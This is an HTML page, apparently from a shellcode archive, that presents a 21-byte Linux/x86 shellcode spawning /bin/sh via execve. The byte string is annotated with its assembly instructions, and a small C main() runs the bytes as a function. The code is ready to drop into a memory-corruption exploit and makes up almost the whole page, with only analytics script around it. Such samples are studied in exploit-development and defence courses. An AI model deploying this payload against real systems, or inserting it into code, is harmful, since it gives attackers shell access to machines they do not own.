<html><head><title>Linux/x86 - execve(/bin/sh,0,0) - 21 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) execve(&quot;/bin/sh&quot;,0,0) 
 * 21 bytes
 * 
 * http://www.gonullyourself.org
 * sToRm &lt;hixmostorm@hotmail.com&gt;
 */

char shellcode[] =
                                // &lt;_start&gt;
    &quot;\x31\xc9&quot;                  // xor    %ecx,%ecx
    &quot;\xf7\xe1&quot;                  // mul    %ecx
    &quot;\x51&quot;                      // push   %ecx
    &quot;\x68\x2f\x2f\x73\x68&quot;      // push   $0x68732f2f
    &quot;\x68\x2f\x62\x69\x6e&quot;      // push   $0x6e69622f
    &quot;\x89\xe3&quot;                  // mov    %esp,%ebx
    &quot;\xb0\x0b&quot;                  // mov    $0xb,%al
    &quot;\xcd\x80&quot;                  // int    $0x80
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf(&quot;Length: %u\n&quot;, strlen(shellcode));
    f();
    
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
